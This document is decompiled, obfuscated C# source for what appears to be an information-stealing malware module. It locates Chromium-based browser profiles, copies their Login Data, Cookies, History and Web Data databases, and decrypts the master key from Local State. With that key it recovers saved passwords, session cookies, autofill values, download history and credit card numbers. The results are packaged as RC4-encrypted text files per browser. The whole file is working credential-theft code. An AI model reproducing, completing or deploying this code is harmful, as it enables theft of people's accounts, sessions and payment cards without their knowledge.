using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000043 RID: 67
	public class Class_49
	{
		// Token: 0x06000109 RID: 265 RVA: 0x000092FC File Offset: 0x000074FC
		public static List<Class_65> vmethod_135()
		{
			Class_49.NClass_0 nclass_ = new Class_49.NClass_0();
			nclass_.field_0 = new List<Class_65>();
			try
			{
				nclass_.field_2 = 0;
				nclass_.field_1 = new object();
				List<string> list = Class_49.tmethod_142();
				using (List<string>.Enumerator enumerator = list.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						Class_49.NClass_1 nclass_2 = new Class_49.NClass_1();
						nclass_2.field_4 = nclass_;
						nclass_2.field_3 = enumerator.Current;
						new Thread(new ThreadStart(nclass_2.nmethod_2)).Start();
					}
				}
				while (nclass_.field_2 != list.Count)
				{
				}
			}
			catch
			{
			}
			return nclass_.field_0;
		}

		// Token: 0x0600010A RID: 266 RVA: 0x000093D0 File Offset: 0x000075D0
		public static void dmethod_136(string str_0)
		{
			Class_49.field_9 = Path.GetTempPath() + "\\bd" + str_0 + ".tmp";
			Class_49.field_10 = Path.GetTempPath() + "\\ls" + str_0 + ".tmp";
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00009420 File Offset: 0x00007620
		public static void kmethod_137(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "History", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "History", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text2 in array)
						{
							string text3 = "";
							try
							{
								if (File.Exists(text2))
								{
									string str = "Unknown (" + text + ")";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text2;
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("downloads");
									int num = class_.pmethod_119();
									for (int k = 0; k < num; k++)
									{
										try
										{
											string text5 = class_.lmethod_118(k, 3);
											string text6 = class_.lmethod_118(k, 15);
											text3 = string.Concat(new string[]
											{
												text3,
												"URL: ",
												text6,
												"\r\nPath: ",
												text5,
												"\r\n----------------------------\r\n"
											});
											Class_49.field_3++;
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Downloads_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text3)));
									text3 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x00009788 File Offset: 0x00007988
		public static void lmethod_138(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "History", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "History", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string str = "Unknown";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("urls");
									int num = class_.pmethod_119();
									for (int k = 0; k < num; k++)
									{
										try
										{
											string text5 = class_.lmethod_118(k, 1);
											string text6 = class_.lmethod_118(k, 2);
											text2 = string.Concat(new string[]
											{
												text2,
												"\r\nTitle: ",
												text6,
												"\r\nUrl: ",
												text5
											});
											Class_49.field_5++;
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\History_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
									text2 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00009ADC File Offset: 0x00007CDC
		private static string pmethod_139(string str_0)
		{
			try
			{
				string[] array = str_0.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600010E RID: 270 RVA: 0x00009B58 File Offset: 0x00007D58
		private static string smethod_140(string str_0)
		{
			try
			{
				return str_0.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x0600010F RID: 271 RVA: 0x00009BC8 File Offset: 0x00007DC8
		private static string xmethod_141(string str_0)
		{
			try
			{
				string[] array = str_0.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_[" + array[1] + "]";
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000110 RID: 272 RVA: 0x00009C50 File Offset: 0x00007E50
		private static List<string> tmethod_142()
		{
			List<string> list = new List<string>();
			List<string> result;
			try
			{
				list.AddRange(Class_69.FindPaths(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				list.AddRange(Class_69.FindPaths(Class_47.\u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				result = list;
			}
			catch
			{
				result = list;
			}
			return result;
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00009CF0 File Offset: 0x00007EF0
		public static void gmethod_143(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					string text2 = "";
					try
					{
						list.AddRange(Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string str = "Unknown";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\Local State";
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									File.Copy(sourceFileName2, Class_49.field_10);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("logins");
									string text5 = File.ReadAllText(Class_49.field_10);
									string[] array4 = Regex.Split(text5, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text5 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = Class_32.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5)), null);
									int num2 = class_.pmethod_119();
									for (int k = 0; k < num2; k++)
									{
										try
										{
											string text6 = class_.lmethod_118(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(text6);
											string str2 = "";
											try
											{
												if (text6.StartsWith("v10") || text6.StartsWith("v11"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													str2 = Class_28.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													str2 = Encoding.Default.GetString(Class_32.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											text2 = text2 + "Url: " + class_.lmethod_118(k, 1) + "\r\n";
											Class_49.field_0 = Class_49.field_0 + class_.lmethod_118(k, 1) + Environment.NewLine;
											text2 = text2 + "Login: " + class_.lmethod_118(k, 3) + "\r\n";
											text2 = text2 + "Passwords: " + str2 + "\r\n";
											text2 = text2 + "Browser: " + str + "\r\n";
											text2 += "----------------------------------------\r\n";
											Class_49.field_1++;
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Passwords_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
									text2 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000A204 File Offset: 0x00008404
		public static void cmethod_144(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					string text2 = "";
					try
					{
						list.AddRange(Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string str = "Unknown";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\..\\Local State";
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									File.Copy(sourceFileName2, Class_49.field_10);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("logins");
									string text5 = File.ReadAllText(Class_49.field_10);
									string[] array4 = Regex.Split(text5, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text5 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = Class_32.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5)), null);
									int num2 = class_.pmethod_119();
									for (int k = 0; k < num2; k++)
									{
										try
										{
											string text6 = class_.lmethod_118(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(text6);
											string str2 = "";
											try
											{
												if (text6.StartsWith("v10") || text6.StartsWith("v11"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													str2 = Class_28.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													str2 = Encoding.Default.GetString(Class_32.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											text2 = text2 + "Url: " + class_.lmethod_118(k, 1) + "\r\n";
											Class_49.field_0 = Class_49.field_0 + class_.lmethod_118(k, 1) + Environment.NewLine;
											text2 = text2 + "Login: " + class_.lmethod_118(k, 3) + "\r\n";
											text2 = text2 + "Password: " + str2 + "\r\n";
											text2 = text2 + "Browser: " + str + "\r\n";
											text2 += "----------------------------------------\r\n";
											Class_49.field_1++;
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Passwords_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
									text2 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x0000A718 File Offset: 0x00008918
		public static void vmethod_145(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string str = "Unknown";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\Local State";
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									File.Copy(sourceFileName2, Class_49.field_10);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("cookies");
									string text5 = File.ReadAllText(Class_49.field_10);
									string[] array4 = Regex.Split(text5, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text5 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = Class_32.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5)), null);
									int num2 = class_.pmethod_119();
									for (int k = 0; k < num2; k++)
									{
										try
										{
											string text6 = class_.lmethod_118(k, 12);
											byte[] bytes = Encoding.Default.GetBytes(text6);
											try
											{
												string text7;
												if (text6.StartsWith("v10"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text7 = Class_28.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text7 = Encoding.Default.GetString(Class_32.DecryptBrowsers(bytes, null));
												}
												string text8 = class_.lmethod_118(k, 1);
												string text9 = class_.lmethod_118(k, 2);
												string text10 = class_.lmethod_118(k, 4);
												string text11 = class_.lmethod_118(k, 5);
												string text12 = class_.lmethod_118(k, 6);
												text2 = string.Concat(new string[]
												{
													text2,
													text8,
													"\tFALSE\t",
													text10,
													"\t",
													text12.ToUpper(),
													"\t",
													text11,
													"\t",
													text9,
													"\t",
													text7,
													"\r\n"
												});
												Class_49.field_4++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Cookies_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
									text2 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000AC34 File Offset: 0x00008E34
		public static void dmethod_146(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string str = "Unknown";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\..\\Local State";
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									File.Copy(sourceFileName2, Class_49.field_10);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("cookies");
									string text5 = File.ReadAllText(Class_49.field_10);
									string[] array4 = Regex.Split(text5, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text5 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = Class_32.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5)), null);
									int num2 = class_.pmethod_119();
									for (int k = 0; k < num2; k++)
									{
										try
										{
											string text6 = class_.lmethod_118(k, 12);
											byte[] bytes = Encoding.Default.GetBytes(text6);
											try
											{
												string text7;
												if (text6.StartsWith("v10"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text7 = Class_28.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text7 = Encoding.Default.GetString(Class_32.DecryptBrowsers(bytes, null));
												}
												string text8 = class_.lmethod_118(k, 1);
												string text9 = class_.lmethod_118(k, 2);
												string text10 = class_.lmethod_118(k, 4);
												string text11 = class_.lmethod_118(k, 5);
												string text12 = class_.lmethod_118(k, 6);
												text2 = string.Concat(new string[]
												{
													text2,
													text8,
													"\tFALSE\t",
													text10,
													"\t",
													text12.ToUpper(),
													"\t",
													text11,
													"\t",
													text9,
													"\t",
													text7,
													"\r\n"
												});
												Class_49.field_4++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Cookies_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
									text2 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000115 RID: 277 RVA: 0x0000B148 File Offset: 0x00009348
		private static List<Class_67> kmethod_147(string str_0)
		{
			List<Class_67> list = new List<Class_67>();
			List<Class_67> result;
			try
			{
				string text = Path.Combine(str_0, "Web Data");
				if (!File.Exists(text))
				{
					result = list;
				}
				else
				{
					string[] array = str_0.Split(new string[]
					{
						"\\"
					}, StringSplitOptions.RemoveEmptyEntries);
					array = array.Take(array.Length - 1).ToArray<string>();
					string str_ = Path.Combine(string.Join("\\", array), "Local State");
					Class_108 class_ = new Class_108(Class_69.CreateTempCopy(text));
					class_.smethod_400("credit_cards");
					for (int i = 0; i < class_.prop_3; i++)
					{
						Class_67 class_2 = null;
						try
						{
							class_2 = new Class_67
							{
								prop_0 = class_.pmethod_399(i, "name_on_card").Trim(),
								prop_1 = Convert.ToInt32(class_.pmethod_399(i, "expiration_month").Trim()),
								prop_2 = Convert.ToInt32(class_.pmethod_399(i, "expiration_year").Trim()),
								prop_3 = Class_25.lmethod_68(class_.pmethod_399(i, "card_number_encrypted"), str_)
							};
							Class_49.field_6++;
						}
						catch
						{
						}
						if (class_2 != null)
						{
							list.Add(class_2);
						}
					}
					result = list;
				}
			}
			catch
			{
				result = list;
			}
			return result;
		}

		// Token: 0x06000116 RID: 278 RVA: 0x0000B2D8 File Offset: 0x000094D8
		public static void lmethod_148(string str_0)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_8);
				list2.Add(Class_49.field_7);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string str = "Unknown";
									foreach (string text4 in Class_49.field_11)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									File.Copy(sourceFileName, Class_49.field_9);
									Class_42 class_ = new Class_42(Class_49.field_9);
									new List<Class_45>();
									class_.tmethod_122("autofill");
									int num = class_.pmethod_119();
									for (int k = 0; k < num; k++)
									{
										try
										{
											string text5 = class_.lmethod_118(k, 0);
											string text6 = class_.lmethod_118(k, 1);
											text2 = string.Concat(new string[]
											{
												text2,
												"Name: ",
												text5,
												"\r\nValue: ",
												text6,
												"\r\n----------------------------\r\n"
											});
											Class_49.field_2++;
										}
										catch
										{
										}
									}
									if (File.Exists(Class_49.field_9))
									{
										File.Delete(Class_49.field_9);
									}
									if (File.Exists(Class_49.field_10))
									{
										File.Delete(Class_49.field_10);
									}
									Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Autofills_" + str + ".txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
									text2 = null;
									GC.Collect();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000B6 RID: 182
		public static string field_0 = "";

		// Token: 0x040000B7 RID: 183
		public static int field_1;

		// Token: 0x040000B8 RID: 184
		public static int field_2;

		// Token: 0x040000B9 RID: 185
		public static int field_3;

		// Token: 0x040000BA RID: 186
		public static int field_4;

		// Token: 0x040000BB RID: 187
		public static int field_5;

		// Token: 0x040000BC RID: 188
		public static int field_6;

		// Token: 0x040000BD RID: 189
		public static readonly string field_7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x040000BE RID: 190
		public static readonly string field_8 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x040000BF RID: 191
		public static string field_9;

		// Token: 0x040000C0 RID: 192
		public static string field_10;

		// Token: 0x040000C1 RID: 193
		private static readonly string[] field_11 = new string[]
		{
			"Chrome",
			"Edge",
			"Yandex",
			"Orbitum",
			"Opera",
			"Amigo",
			"Torch",
			"Comodo",
			"CentBrowser",
			"Go!",
			"uCozMedia",
			"Rockmelt",
			"Sleipnir",
			"SRWare Iron",
			"Vivaldi",
			"Sputnik",
			"Maxthon",
			"AcWebBrowser",
			"Epic Browser",
			"MapleStudio",
			"BlackHawk",
			"Flock",
			"CoolNovo",
			"Baidu Spark",
			"Titan Browser",
			"Google",
			"browser"
		};

		// Token: 0x02000044 RID: 68
		[CompilerGenerated]
		private sealed class NClass_0
		{
			// Token: 0x06000119 RID: 281 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_0()
			{
				base..ctor();
			}

			// Token: 0x040000C2 RID: 194
			public List<Class_65> field_0;

			// Token: 0x040000C3 RID: 195
			public object field_1;

			// Token: 0x040000C4 RID: 196
			public int field_2;
		}

		// Token: 0x02000045 RID: 69
		[CompilerGenerated]
		private sealed class NClass_1
		{
			// Token: 0x0600011A RID: 282 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_1()
			{
				base..ctor();
			}

			// Token: 0x0600011B RID: 283 RVA: 0x0000B76C File Offset: 0x0000996C
			internal void nmethod_2()
			{
				Class_65 class_ = new Class_65();
				try
				{
					string fullName = new FileInfo(this.field_3).Directory.FullName;
					if (!string.IsNullOrEmpty(this.field_3.Contains(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold) ? Class_49.smethod_140(fullName) : Class_49.xmethod_141(fullName)) && !string.IsNullOrEmpty(Class_49.pmethod_139(fullName)))
					{
						class_.prop_4 = Class_49.kmethod_147(fullName).IsNull<List<Class_67>>();
					}
				}
				catch
				{
				}
				object field_ = this.field_4.field_1;
				lock (field_)
				{
					IList<Class_66> list = class_.prop_5;
					if (list == null || list.Count <= 0)
					{
						IList<Class_68> list2 = class_.prop_2;
						if (list2 == null || list2.Count <= 0)
						{
							IList<Class_67> list3 = class_.prop_4;
							if (list3 == null || list3.Count <= 0)
							{
								IList<Class_64> list4 = class_.prop_3;
								if (list4 == null || list4.Count <= 0)
								{
									goto IL_10F;
								}
							}
						}
					}
					this.field_4.field_0.Add(class_);
					IL_10F:
					int field_2 = this.field_4.field_2;
					this.field_4.field_2 = field_2 + 1;
				}
			}

			// Token: 0x040000C5 RID: 197
			public string field_3;

			// Token: 0x040000C6 RID: 198
			public Class_49.NClass_0 field_4;
		}
	}
}
